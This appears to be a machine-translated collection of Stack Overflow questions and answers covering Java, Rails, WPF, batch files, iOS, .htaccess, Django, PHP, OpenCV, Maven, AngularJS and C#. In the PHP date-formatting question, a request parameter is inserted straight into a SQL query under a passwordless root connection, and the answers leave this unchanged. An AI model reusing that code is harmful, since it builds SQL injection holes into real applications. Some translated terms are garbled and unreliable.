我正在尝试为我的应用程序实现一个拦截器，它能够跟踪它看到的对象。我需要能够分辨出我现在看到的对象是新的还是重复使用的。

假设我有一个这样的界面：

```
public interface Interceptor {
    void process(Object o);
} 
```

我一直在考虑添加一个 Set 来跟踪这些对象。但既然我不想用这种行为引起内存泄漏，也许我应该设计一些其他的模式？最后，这些对象可能会在其他层中被破坏。

可能的解决方案似乎：

*   将对象的 hashCode 放入 Set
*   使用 Wea​​kHashSet 而不是 HashSet

第一个选项似乎不是 100% 可靠，因为 hashCode 可能不是唯一的。至于第二个选项，我不确定这会防止内存泄漏。

还有一点，我不能修改对象，不能添加字段、方法。包装也不是一种选择。

有任何想法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-17T14:21:42.757

`WeakReferences`是要走的路。从[这里](http://weblogs.java.net/blog/2006/05/04/understanding-weak-references)：

> 简而言之，弱引用是一种强度不足以强制对象保留在内存中的引用。弱引用允许您利用垃圾收集器为您确定可达性的能力，因此您不必自己做。

即保持 a`WeakReference`不会强制 JVM 保持对该对象的引用。

> 当然，弱引用的强度不足以防止垃圾回收，因此您可能会发现（如果没有对小部件的强引用）weakWidget.get() 突然开始返回 null。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:42:31.903

只是对 Brian Agnew 正确答案的补充。java API中没有`WeakHashSet`类，你需要`WeakHashMap`像这样创建它：

```
Set<Object> weakHashSet = Collections.newSetFromMap(
        new WeakHashMap<Object, Boolean>()); 
```

请参阅[Collections.newSetFromMap](http://docs.oracle.com/javase/7/docs/api/java/util/Collections.html#newSetFromMap%28java.util.Map%29) java 文档。

# ruby-on-rails - 嵌套表单不验证关联模型

> ID：12461278
> 
> 赞同：0
> 
> 时间：2012-09-17T14:19:32.620
> 
> 标签：ruby-on-rails, ruby-on-rails-3, activerecord

我正在使用带有活动记录和 sqlserver 的 rails 3.2。我对嵌套表单有疑问。我有一个模型注册，其中包含许多注册详细信息，并且每个都有关联的人。

这是模型

```
class Registration < ActiveRecord::Base
    set_table_name "dbo.EV_INSCRIPCIONES"
    set_primary_key "Id"

    belongs_to :category, :foreign_key => 'CategoriaId'
    has_many :registrationDetails, :foreign_key => 'InscripcionEventoId'
    #has_one :group

    accepts_nested_attributes_for :registrationDetails
    validates_associated :registrationDetails

    validates :Refencia, :presence => true

    #validates_presence_of :category_id

    attr_accessible :registrationDetails, :category,  :Eliminada, :FechaInscripcion, :CreationalDate, :Referencia, :PagoRegistrado, :Acreditado, :registrationDetails_attributes

    #after_initialize :init 

    def init
        write_attribute :Eliminada, false
        write_attribute :Acreditado, false
        write_attribute :PagoRegistrado, false
        write_attribute :CreationalDate, DateTime.now
        write_attribute :FechaInscripcion, DateTime.now
        #write_attribute :Referencia, ''
    end

    def category_id
        self.category.id unless category.nil?
    end

    def category_id=(id)
        self.category = Category.find(id)
    end

end

class RegistrationDetail < ActiveRecord::Base
    set_table_name "dbo.EV_INSCRIPCION_DETALLE"
    set_primary_key "Id"

    belongs_to :registration, :foreign_key => 'InscripcionEventoId'
    belongs_to :category, :foreign_key => 'CategoriaId'
    belongs_to :person, :foreign_key => 'ParticipanteId', :primary_key => 'JUGADOR_ID'

    attr_accessible :person, :category, :registration, :Eliminada, :person_attributes

    accepts_nested_attributes_for :person
    validates_associated :person

    after_initialize :init 

    def init
        write_attribute :Eliminada, false

    end

end

class Person < ActiveRecord::Base
    set_table_name "dbo.PKR_JUGADOR"
    set_primary_key "JUGADOR_ID"

    has_many :registrationDetails

    validates_presence_of :CDNI, :CNOMBRES, :CAPELLIDO, :CSEXO,:CCIUDADRESIDENCIA, :DFECHANACIMIENTO
    validates :CDNI, :length => { :minimum => 7, :maximum =>8 }
    #validate :validate_birth_date

    before_save :set_ids

    def set_ids 
        if id.nil?
            _id = Person.maximum(:JUGADOR_ID)
            self.JUGADOR_ID = _id +1
            write_attribute :CNROJUGADOR, _id+1         
        end 
    end     

    after_initialize :init
    def init        
        write_attribute :TIPODOCUMENTO_ID, 1 if read_attribute(:TIPODOCUMENTO_ID).nil? 
    end

    def full_name
        self.surname + ", " + self.name
    end

    protected
        def validate_birth_date
            errors.add(:birth_date, 'must be a valid datetime') if ((Date.strptime(birth_date, "%d/%m/%Y") rescue ArgumentError) == ArgumentError)
        end 
```

结尾

我的观点

index.html.erb

```
<h1><%= t '.title', :name => @event.CNOMBRETORNEO %> </h1>
<%= render 'form_nested' %> 
```

_form_nested

```
<%= form_for @registration, :url => {:controller => "registration", :action => "save"}, :html => {:class=> 'form-horizontal'} do |f| %>
    <legend><%= t '.legend' %></legend> 
    <% if f.object.errors.any?%>
    <div id="error_explanation">
        <h3 class="text-error"><%= t '.has-errors' %></h3>
    </div>
    <% end %>

    <input type="hidden" id="event_date" name="event_date" value="<%= @event.DDIAACTIVIDAD.strftime('%Y%m%d') %>" />
    <input type="hidden" id="event_id" name="event_id" value="<%= @event.TORNEOPOKER_ID %>" />

    <%= f.fields_for :registrationDetails do |d|  %>
        <%= render 'details_fields' , :f => d %>
    <% end %>

    <% has_error = f.object.errors.has_key? :category %>
    <div class="control-group<%= " error" if has_error %>">
        <%= f.label :category, :class=> 'control-label' %>
        <div class="controls">
            <%= f.hidden_field :category_id %>
            <div class="btn-group" data-toggle-name="presenter_category_id" data-toggle="buttons-radio">
            <%@categorias.each do |x| %>
                <button value="<%= x.Id %>" type="button" class="btn" data-age-from="<%= x.FromAge %>" data-age-to="<%= x.ToAge %>"><%= x.Name %></button>
            <%end  %>
            </div>
            <% if has_error  %>         
            <span class="help-inline"><%=f.object.errors[:category].join(", ")%></span>
            <% end %>
        </div>
    </div>

    <div class="form-actions">
        <button type="submit" class="btn btn-primary"><%= t '.save' %></button>
    </div>

<%end%> 
```

_detatails_fields

```
<%= f.object.errors.inspect %>

<%= f.fields_for :person do |p| %>
    <%= render 'person_fields', :f => p %>
<% end %> 
```

_person_fields

```
<%= f.hidden_field :id %>
<% has_error = f.object.errors.has_key? :CDNI %>
<div class="control-group<%= " error" if has_error %>">
    <%= f.label :CDNI, :class=> 'control-label' %>
    <div class="controls">
        <div class="input-append">
            <span class="add-on"><i class="icon-book"></i></span>
            <%= f.text_field :CDNI, :class => 'input' %>
            <div class="add-on" id="document_loader"><%= image_tag '6-0.gif' %></div>
        </div>
        <% if has_error  %>         
        <span class="help-inline"><%=f.object.errors[:CDNI].join(", ")%></span>
        <% end %>
    </div>
</div>

<% has_error = f.object.errors.has_key? :DFECHANACIMIENTO %>
<div class="control-group<%= " error" if has_error %>">
    <%= f.label :DFECHANACIMIENTO, :class=> 'control-label' %>
    <div class="controls">
        <div class="input-append">
            <span class="add-on"><i class="icon-calendar"></i></span>
            <%= f.text_field :DFECHANACIMIENTO, :class=>'input' %>
            <span id="person_age" class="add-on"></span>
        </div>
        <% if has_error  %>         
        <span class="help-inline"><%=f.object.errors[:DFECHANACIMIENTO].join(", ")%></span>
        <% end %>
    </div>
</div>

<% has_error = f.object.errors.has_key? :CNOMBRES %>
<div class="control-group<%= " error" if has_error %>">
    <%= f.label :CNOMBRES, :class=> 'control-label' %>
    <div class="controls">
        <div class="input-append">
            <span class="add-on"><i class="icon-user"></i></span>
            <%= f.text_field :CNOMBRES,:class=>'input' %>
        </div>
        <% if has_error  %>         
        <span class="help-inline"><%=f.object.errors[:CNOMBRES].join(", ")%></span>
        <% end %>
    </div>
</div>
<% has_error = f.object.errors.has_key? :CAPELLIDO %>
<div class="control-group<%= " error" if has_error %>">
    <%= f.label :CAPELLIDO, :class=> 'control-label' %>
    <div class="controls">
        <div class="input-append">
            <span class="add-on"><i class="icon-user"></i></span>
            <%= f.text_field :CAPELLIDO,:class=>'input' %>
        </div>
        <% if has_error  %>         
        <span class="help-inline"><%=f.object.errors[:CAPELLIDO].join(", ")%></span>
        <% end %>
    </div>
</div>

<div class="control-group">
    <%= f.label :CTELEFONO, :class=> 'control-label' %>
    <div class="controls">
        <div class="input-append">
            <span class="add-on"><i class="icon-certificate"></i></span>
            <%= f.text_field :CTELEFONO,:class=>'input' %>
        </div>
    </div>
</div>
<% has_error = f.object.errors.has_key? :CSEXO %>
<div class="control-group<%= " error" if has_error %>">
    <%= f.label :CSEXO, :class=> 'control-label' %>
    <div class="controls">
        <%= f.hidden_field :CSEXO %>
        <div class="btn-group" data-toggle-name="presenter_sex" data-toggle="buttons-radio">
            <button type="button" class="btn" value="M"><%= t '.masculine' %></button>
            <button type="button" class="btn" value="F"><%= t '.femenine' %></button>
        </div>
        <% if has_error  %>         
        <span class="help-inline"><%=f.object.errors[:CSEXO].join(", ")%></span>
        <% end %>
    </div>
</div>      
<% has_error = f.object.errors.has_key? :CCIUDADRESIDENCIA %>
<div class="control-group<%= " error" if has_error %>">
    <%= f.label :CCIUDADRESIDENCIA, :class=> 'control-label' %>
    <div class="controls">
        <div class="input-append">
            <span class="add-on"><i class="icon-map-marker"></i></span>
            <%= f.text_field :CCIUDADRESIDENCIA,:class=>'input' %>
        </div>
        <% if has_error  %>         
        <span class="help-inline"><%=f.object.errors[:CCIUDADRESIDENCIA].join(", ")%></span>
        <% end %>
    </div>
</div> 
```

最后是控制器

```
class RegistrationController < ApplicationController
    def index
        date = "20120729"
        id = 1

        #id = params[:event_id] unless params[:event_id].nil?
        #date = params[:event_date] unless params[:event_date].nil?

        @event = Event.find(date,id)
        @groups = Group.all
        @categorias = Category.where("DiaActividad = ? and TorneoId = ?", date, id)

        @registration = Registration.new
        @registration.registrationDetails.build( :person => Person.new)
    end

    def save
        @registration = Registration.new(params[:registration])
        if @registration.save
            redirect_to :controller => 'home'
        else
            date = params[:event_date]
            id = params[:event_id]  
            @event = Event.find(date,id)
            @groups = Group.all
            @categorias = Category.where("DiaActividad = ? and TorneoId = ?", date, id)
            render :action => 'index'
        end
    end

end 
```

怎么了？首先，不会保存任何字段的更改，也不会显示验证。当我提交表单时，它返回到同一页面，并且似乎表单有错误但没有显示，并且数据丢失了。

希望您能够帮助我。

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-19T12:53:23.933

好吧，我不知道为什么，但我使用资源解决了。

在我的 routes.rb 文件中

```
resources :registrations 
```

在我有这样的事情之前。

```
 match 'registration/(:event_date)/(:event_id)' => 'registration#index'
  match 'registration/save' => 'registration#save' 
```

我认为问题出在我的自定义路线上。但我真的不知道。

# wpf - 基于属性的验证和 ErrorMessage

> ID：12461284
> 
> 赞同：0
> 
> 时间：2012-09-17T14:19:54.363
> 
> 标签：wpf, mvvm, data-annotations

我在网上研究了验证技术，发现了这篇文章

[http://www.codeproject.com/Articles/97564/Attributes-based-Validation-in-a-WPF-MVVM-Applic](http://www.codeproject.com/Articles/97564/Attributes-based-Validation-in-a-WPF-MVVM-Applicat)

有谁知道如果从属性中删除 ErrorMessage="" 为什么不会发生验证？

这行得通

```
[Required(ErrorMessage="error message")] 
```

这不

```
[Required()] 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T14:30:18.703

我不使用基于属性的验证，但我认为这是因为 IDataErrorInfo 接口需要传入一个字符串：

```
public string this[string propertyName]{} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T18:34:55.793

[您应该始终使用ValidationAttribute.FormatErrorMessage](http://msdn.microsoft.com/en-us/library/system.componentmodel.dataannotations.validationattribute.formaterrormessage%28v=vs.100%29.aspx)方法检索错误消息，因为如果未指定通过 ErrorMessage 属性的直接消息或未指定基于资源的错误消息，它具有使用默认值的回退机制。

# batch-file - 如何将批处理文件变量分配给另一个变量？

> ID：12461287
> 
> 赞同：1
> 
> 时间：2012-09-17T14:20:03.637
> 
> 标签：batch-file

我有以下代码：

```
 for /f "tokens=1 delims=," %%i in (%T1R%.orignal) do (
    set LINE="%%i"
    set LINE1=%LINE%
    echo %LINE1% >> %T1R%
  ) 
```

产生以下内容：

```
...
set LINE="    <Reference Include="Elmah">"
set LINE1=
echo   1>>C:\Temp\sync-msbuild-1R.txt
... 
```

我看过其他类似的问题，看来这应该可行，但它不在我的系统上。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T16:31:35.710

我不确定你的代码到底应该实现什么（为什么不直接使用`Line`，`LINE1`甚至更好`%%i`），但如果你想使用在循环中定义的变量，你应该使用[延迟扩展](http://www.robvanderwoude.com/variableexpansion.php)：

```
SETLOCAL ENABLEDELAYEDEXPANSION 
```

然后使用`!`代替`%`：

```
SET LINE1=!LINE! 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-18T14:58:53.267

我找不到允许我在 DO 块中有两个 SET 命令的答案，所以我最终通过使用 PowerShell 来完成任务来解决这个问题：

```
PowerShell -Command "((Get-Content %T1R%) | Foreach-Object {$_ -replace '""[^\w]*>', ''} | Set-Content %T1R%)" 
```

# sublimetext2 - 如何让 JSHint smarttabs 选项在 Sublime Text 2 中工作

> ID：12461291
> 
> 赞同：0
> 
> 时间：2012-09-17T14:20:11.697
> 
> 标签：sublimetext2, jshint

我似乎无法让 Sublime Text 2 SublimeLinter 包停止显示“混合制表符和空格”警告。

我已经在设置中设置了 "smarttabs" : true ，但它仍然没有接受。

还有其他人解决了这个问题吗？

这是我对 SublimeLinter 包的用户设置：[https ://gist.github.com/3737558](https://gist.github.com/3737558)

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-19T12:28:11.387

我这样解决问题。

首先不要在文件中混合使用制表符和空格。仅使用空格。Sublime 可以很好地处理没有硬制表符的缩进。

将 Sublime Text 2 设置为仅使用空格：

```
// Tab and whitespace handling.
// Indent using spaces, 4 spaces ber indent by default, clean up extra whitespaces on save
"tab_size": 4,
"translate_tabs_to_spaces": true,
"trim_automatic_white_space": true,
"trim_trailing_white_space_on_save": true,

// Do not try to detect the tab size from the opened file
"detect_indentation" : false, 
```

如果您遇到任何带有混合制表符和空格的旧文件，您只能从*“查看”>“缩进”>“将制表符转换为空格”*菜单将它们转换为空格。

为什么制表符在您的源代码中不好

*   [http://opensourcehacker.com/2012/05/13/never-use-hard-tabs/](http://opensourcehacker.com/2012/05/13/never-use-hard-tabs/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-19T05:21:59.653

我有同样的问题，也许我找到了原因

选项可以控制tab后空格时的`smarttabs`警告，但不能控制空格后的警告标签，你可以试试

如果要禁用警告，可以在文件顶部添加注释

`/*jshint -W099*/`

# ios - ios中的圆形图像视图

> ID：12461292
> 
> 赞同：4
> 
> 时间：2012-09-17T14:20:12.833
> 
> 标签：ios, ios5, ios4

我想在 ios 中制作完整的圆形`imageview`以显示任何用户的个人资料照片。

是否有可能与`layer.cornerRadius`财产或需要找到其他解决方案？

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-08-20T08:11:30.187

是的，您可以使用`layer.cornerRadius`，只是不要忘记添加`layer.masksToBounds = YES;`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T16:42:38.893

使用 QuartzCore 是最适合您的解决方案，请参阅此[答案](https://stackoverflow.com/questions/1878595/how-to-make-a-circular-uiview?answertab=active#tab-top)，它会对您有所帮助。

注意：适用于的`UIView`将适用于`UIImageView`。

# apache - 阻止盗链但将某些页面/搜索引擎列入白名单

> ID：12461294
> 
> 赞同：1
> 
> 时间：2012-09-17T14:20:16.937
> 
> 标签：apache, .htaccess, search-engine, http-referer

我现在正在做的是阻止某个文件夹中任何图像的热链接并重定向到包含该图像的网站：

```
RewriteEngine on
RewriteCond %{HTTP_REFERER} !^http://(www\.)?mydomain.com/.*$ [NC]
RewriteRule (.*)\.(gif|jpg|png)$ /$1.html [R,L] 
```

我现在要做的是将某些页面列入白名单

例如 bing.com | google.com | google.fr | google.de | 等等

我想这是一项相当容易的任务，但我对 .htaccess 很糟糕：/

谢谢您的帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T15:56:42.950

你可以试试：

```
RewriteEngine on
RewriteCond %{HTTP_REFERER} !^http://(www\.)?mydomain.com/.*$ [NC]
# add whatever other search engines you want to whitelist
RewriteCond %{HTTP_REFERER} !(bing.com|google|yahoo) [NC]
RewriteRule (.*)\.(gif|jpg|png)$ /$1.html [R,L] 
```

# django - 在 Django 查询中使用 OR 操作

> ID：12461298
> 
> 赞同：0
> 
> 时间：2012-09-17T14:20:33.177
> 
> 标签：django

嗨，我正在尝试在 django 查询中使用 OR 运算符。我的代码看起来像：

```
hotels = models.Hotel.objects.filter(
        wed=True,
        county=hotel_main.county.id,
        (x=True)|(y=True)|(z=True),
        subscriptions__end_date__gte=datetime.date.today(),
        subscriptions__enquiry_count__lte=F('subscriptions__tier__enquiry_limit'),
    ).distinct() 
```

我正在尝试获取至少具有上述 x、y、z 之一的记录。任何帮助...谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:22:41.943

[Q 对象](http://docs.djangoproject.com/en/dev/topics/db/queries/#complex-lookups-with-q-objects)

```
Contact.objects.filter(Q(last_name__icontains=request.POST['query']) | 
                           Q(first_name__icontains=request.POST['query'])) 
```

REF：[Django 模型查询中的 OR 运算符](https://stackoverflow.com/questions/5445174/or-operator-in-django-model-queries)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-17T14:22:55.850

您将不得不使用[Q](https://docs.djangoproject.com/en/dev/topics/db/queries/#complex-lookups-with-q-objects)对象。像这样的东西：

```
hotels = models.Hotel.objects.filter(
    wed=True,
    county=hotel_main.county.id,
    subscriptions__end_date__gte=datetime.date.today(),
    subscriptions__enquiry_count__lte=F('subscriptions__tier__enquiry_limit')).filter( Q(x=True) | Q(y=True) | Q(z=True)).distinct() 
```

# php - PHP/SQL 中的日期格式

> ID：12461299
> 
> 赞同：1
> 
> 时间：2012-09-17T14:20:38.770
> 
> 标签：php, mysql, sql

我正在学习 PHP，并且有一段查询数据库的 PHP 代码。我获得了一个已经在数据库中的日期，并且想知道这段代码`format('dd-mm-yyyy');`是否可以将数据从默认的 'YYYY-MM-DD' 格式化为 'DD-MM-YYYY' 以及如何使用该代码？

```
<?php 

    $rfp = $_GET['cid'];
 // Connects to Database 
 mysql_connect("localhost", "root") or die(mysql_error()); 
 mysql_select_db("test") or die(mysql_error()); 
 $data = mysql_query("SELECT rfp_id, issue_date, rfp_status.status FROM company, rfp, rfp_status WHERE company.company_id = rfp.company_id AND rfp_status.status_id = rfp.status_id AND company.company_id = '$rfp'") 
 or die(mysql_error()); 
  echo "<table border=1px cellpadding=15 bordercolor='#0000CC'>";
   #echo "<table border=0 cellpadding=15 bordercolor='#0000CC'>";
echo "<tr align = center bgcolor=white>
<td><b>RFP ID</b></td><td><b>Date Added</b></td><td><b>Status</b></td>" ; 
 while($row = mysql_fetch_array($data)){
      $rid = $row['rfp_id'];  
      $idate = $row['issue_date'];
      $status = $row['status'];

# inserts value into table as a hyperlink

echo "<tr align = center bgcolor=white><td>$rid</td><td><b><a target='_blank' href=view_section_detail.php?rid=$rid>$idate</a></b></td><td>$status</td>";
}

# displays table

print '</table>';

 ?> 
```

任何帮助，将不胜感激

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T14:23:16.757

在 MySQL 中，您可以使用**[`DATE_FORMAT()`](http://davidwalsh.name/format-date-mysql-date_format)**

```
SELECT DATE_FORMAT(colName, '%d-%m-%Y') formattedDate
FROM...
WHERE ... 
```

**[其他格式在这里](http://davidwalsh.name/format-date-mysql-date_format)**

# [*SQLFiddle 演示*](http://sqlfiddle.com/#!2/d41d8/2056)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-17T14:23:10.663

没有`format()`：

```
$idate = strtotime($row['issue_date']); // assuming $row['issue_date'] is YYYY-MM-DD
$idate = date('d-m-Y', $idate); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-17T14:23:18.487

您可以使用 mysql [date_format](http://dev.mysql.com/doc/refman/5.5/en/date-and-time-functions.html#function_date-format)直接在数据库查询中执行此操作：

```
SELECT rfp_id, date_format(issue_date,'%d-%m-%Y') as issue_date... etc 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-17T14:27:39.470

尝试这个

```
while($row = mysql_fetch_array($data)){
      $rid = $row['rfp_id'];  
      $idate = date("d-m-Y", strtotime($row['issue_date']));
      $status = $row['status'];

# inserts value into table as a hyperlink

echo "<tr align = center bgcolor=white><td>$rid</td><td><b><a target='_blank' href=view_section_detail.php?rid=$rid>$idate</a></b></td><td>$status</td>";
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-17T14:24:55.140

尝试这个

```
$idate = date('d-m-Y',strtotime($row['issue_date'])); 
```

# c++ - 在 OpenCV 中确定矩阵的类型

> ID：12461300
> 
> 赞同：0
> 
> 时间：2012-09-17T14:20:39.173
> 
> 标签：c++, image-processing, opencv, matrix

我正在尝试在 opencv 中索引 3 通道图像。

当我读入图像文件时，此代码有效

```
int Blue  = LeftCol.at<cv::Vec3b>(v,u)[0];
int Green = LeftCol.at<cv::Vec3b>(v,u)[1]; 
int Red   = LeftCol.at<cv::Vec3b>(v,u)[2]; 
```

但是当我使用网络摄像头输入时它会崩溃。网络摄像头有 3 个频道，`u,v`从`0,0`. 我不知道为什么它不起作用。我已经尝试了所有变`Vec3b`体，，，，，`Vec3i``Vec3s``Vec3f``Vec3d`

我迷路了......为什么我不能索引这个网络摄像头图像？

## 编辑

就这样，几个小时后，这就是我必须要去的地方……这是程序的大纲。我在函数内部遇到了上面提到的问题。所以我回到了基础，试图在函数之前查看矩阵......

```
void main (int argc, char** argv) {
Mat LeftCol;
while (1==1) {
    if (ProgramMode == "Files") {
        //read in the colour images
        LeftCol  = imread(ColImLeft.c_str(),1);
        RightCol = imread(ColImRight.c_str(),1);

    } else if (ProgramMode == "Camera") {
        VideoCapture CapLeft, CapRight;
        CapLeft.open(1);
        CapRight.open(2);

        CapLeft  >> LeftCol;
        CapRight >> RightCol;

                    //THIS WORKS, THIS PIXEL VALUES ARE DISPLAYED
        cout << "uchar" << endl;
        for (int x=0;x<10;x++) {
            for (int y=0;y<10;y++) {
                int pixel = LeftCol.at<cv::Vec3b>(x,y)[0];
                cout << pixel;
            }
            cout << endl;
        }
    } //end if

            ///////ADDED THIS BIT ////////
    cout << "channels = " << LeftCol.channels() << endl;
            //^^This bit works, output shows "channels = 3"

            //vv This bit doesn't work.... so there's a problem with LeftCol.
            //I wonder if reading the data like CapLeft  >> LeftCol; is changing something
    imshow("Test",LeftCol);
            ///////ADDED THIS BIT ////////

           //THIS DOES NOT WORK WHEN USING THE CAMERA INPUT, PROGRAM CRASHES
    cout << "uchar" << endl;
    for (int x=0;x<10;x++) {
        for (int y=0;y<10;y++) {
            int pixel = LeftCol.at<cv::Vec3b>(x,y)[0];
            cout << pixel;
        } //end for
        cout << endl;
    } //end for

   } //end while
} //end main 
```

是的，我已经让它工作了，但它并不理想。我正在创建一个临时`Mat`文件以将文件读入其中然后克隆它们。

```
 Mat TempLeft;
        Mat TempRight;

        VideoCapture CapLeft, CapRight;
        CapLeft.open(1);
        CapRight.open(2);

        CapLeft  >> TempLeft;
        CapRight >> TempRight;

        LeftCol = TempLeft.clone();
        RightCol = TempRight.clone(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-18T10:48:03.540

OpenCV makes soft copies of images whenever possible. [From the documentation](http://opencv.itseez.com/modules/core/doc/basic_structures.html#mat):

> the array assignment is an O(1) operation because it only copies the header and increases the reference counter. The Mat::clone() method can be used to get a full (deep) copy of the array when you need it.

I suspect what is happening is `LeftCol` uses data which still belongs with the `VideoCapture` object. If this is the case then when `CapLeft` and `CapRight` go out of scope at the end of the `if` they are closed by the destructor and the image data which `LeftCol` is still pointing to is destroyed.

Possible solutions would be to clone the image as you are doing, or declare `VideoCapture CapLeft, CapRight;` outside of the if block (you can still open them inside if needed).

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-02-01T23:45:45.073

正因为您尝试了所有 Vec* 组合，所以这是完整列表，我的 2ct：

```
typedef Vec< uchar, 3 >     Vec3b   (so normal 8 bit)
typedef Vec< double,3 >     Vec3d   (so normal double precision)
typedef Vec< float, 3 >     Vec3f   (so normal floating point)
typedef Vec< int,   3 >     Vec3i   (normal int)
typedef Vec< short, 3 >     Vec3s
typedef Vec< ushort 3 >     Vec3w   (so normal 16 bit) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-17T15:06:20.267

您可以使用 cv::Mat.type() 检查类型，使用 cv::Mat.channels() 检查通道数

摄像头返回的数据会按照B、G、R的顺序转换成Vec3b（即uchar * 3）。

你确定图像是有效的 - 其他地方有错误吗？

# ios - 导航栏和状态栏上的 UIImage 视图

> ID：12461301
> 
> 赞同：-1
> 
> 时间：2012-09-17T14:20:40.330
> 
> 标签：ios, uinavigationbar, uistatusbar

我想问你是否可以将图像叠加到导航栏和状态栏上，以便像 twitter 集成表单那样模糊它们......有人可以帮我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T16:48:11.513

您可以使用模型视图控制器来完成此操作，您可以阅读本[教程](http://useyourloaf.com/blog/2010/05/03/ipad-modal-view-controllers.html)以了解如何使用它。

# spring - spring依赖maven多模块

> ID：12461302
> 
> 赞同：1
> 
> 时间：2012-09-17T14:20:42.717
> 
> 标签：spring, maven, maven-3

我的项目有以下结构：-

```
parent POM 
|-- app-core
|-- app-model
|-- app-services
`-- app-web 
```

应用程序核心：在**斯普林斯**

app-services : 在**球衣休息**

*app-services*使用*app-core.jar*

问题：如果我将 spring-dependencies 添加到我的 app-core，app-services 如何访问`applicationContext.xml`. 我是否还需要将 spring-dependencies 添加到我的 app-services 模块中？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-18T06:22:12.770

只需`app-core`在 pom 中添加 as maven 依赖项`app-services`，您就可以访问`applicationContext.xml`as `classpath:applicationContext.xml`。

# jquery - ng-repeat 中的 AngularJS 指令

> ID：12461304
> 
> 赞同：1
> 
> 时间：2012-09-17T14:20:49.393
> 
> 标签：jquery, angularjs, sparklines

我正在尝试使用 Angular 的 ng-repeat 来显示 jQuery 迷你图。我已经将迷你图包装在 angular 指令中以告诉它调用。似乎尽管在那里有一个帖子链接，但仍然为时过早调用迷你图。我在下面附上了我的代码：

```
var Timeline = angular.module('Timeline', []);
  Timeline.directive('sparkline', function () {
    return {
    restrict: 'E', 
    scope: { 
      val: '=',
    },
        link: function postLink(scope, iElement, attrs) {
      scope.$watch('scalars', function (newVal, oldVal) {
    $(iElement).sparkline('html', { 
           type:'bar', barColor:'#1e42c8', height:'40px', barWidth:10 , barSpacing:2
        });
      });
    }
  };
}); 
```

HTML

```
<div class="row" ngChange:false ng-repeat="(description,scalars) in vitals | orderBy:orderProp">
  <div class="span4">
    <p><sparkline exp="data" class="sparkline">{{scalars.join(',')}}</sparkline></p>
  </div>
</div> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-31T15:42:07.140

对于任何跳入这个问题的人：对于一个有效的迷你图指令，我建议你检查这个小提琴：http: [//jsfiddle.net/m48u/h8PdR/15/](http://jsfiddle.net/m48u/h8PdR/15/)（**不是我**）。该指令本身看起来像这样 -

```
myapp.directive("bulletcharksparkline", function() {
return {
    restrict:"E",
    scope:{
        data:"@"
    },
    //template: "<div class='tpl'></div>",
    compile: function(tElement,tAttrs,transclude){
        tElement.replaceWith("<span>"+tAttrs.data+"</span>");
        return function(scope, element, attrs){
            attrs.$observe("data", function(newValue){
                element.html(newValue);
                element.sparkline('html',{type:'bullet'});
            });
        };
    }
};
}); 
```

# php - 查询运行次数与刷新次数一样多

> ID：12461307
> 
> 赞同：2
> 
> 时间：2012-09-17T14:20:56.050
> 
> 标签：php

如果可能的话，我需要重新加载的帮助。我的意思是我有这个查询，它在一个页面中提交，有这个个人资料注册，用户输入他的姓名和姓氏，然后他在下一页继续输入更具体的细节。如果用户重新加载页面，即 4 次，这就是用户信息被插入数据库的次数。

是否有任何重新加载功能来防止提交查询？如果您要问我，我没有尝试过任何事情，因为我不知道如何开始。我唯一的线索是关于使用 ajax，但是有没有任何 php 方法可以做到这一点？

谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-17T14:23:07.970

您应该遵循[POST-Redirect-GET 模式](http://docforge.com/wiki/POST-Redirect-GET)并在成功 POST 后始终重定向：

在没有看到您的代码的情况下，您将需要这样的重定向：

```
if($inserted){
    header('Location: mypage.php?msg=reg_success');
    exit;
} 
```

然后，在 mypage.php 上，你可以这样：

```
if(isset($_GET['msg'])){

    switch($_GET['msg']){

        case 'reg_success':
            echo 'Registration successful!';
        break;

    }

} 
```

或者，您可以为成功消息创建一个数组：

```
$success_messages = array(
    'reg_success' => 'Registration successful!',
    'logout_success' => 'Logged out!'
); 
```

然后在 mypage.php 上：

```
if(isset($_GET['msg']) && array_key_exists($_GET['msg'], $success_messages)){
    $msg_index = $_GET['msg'];
    echo $success_messages[$msg_index];
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T14:23:04.710

您应该在会话中记录所有注册数据，并在用户单击“完成”按钮后写入一次。

然后重定向他并清除相关的会话数据。

通过这种方式，您可以拥有任意数量的阶段页面，并且不会重复任何内容。

# c# - 在 C# 中创建透明覆盖

> ID：12461312
> 
> 赞同：2
> 
> 时间：2012-09-17T14:21:07.270
> 
> 标签：c#, overlay, global, keyboard-hook, click-through

我不确定如何开始这个项目，但我的要求如下（对于我不确定如何实现的部分）：

*   按住 Tab 键应显示覆盖。放开 tab 键应该隐藏覆盖。我将如何在全球范围内捕捉到这一点？检查 Tab 键是否仍被按住的最佳方法是什么？
*   覆盖应显示在所有其他应用程序之上。它不必显示在全屏应用程序上，但能够这样做是最佳选择。
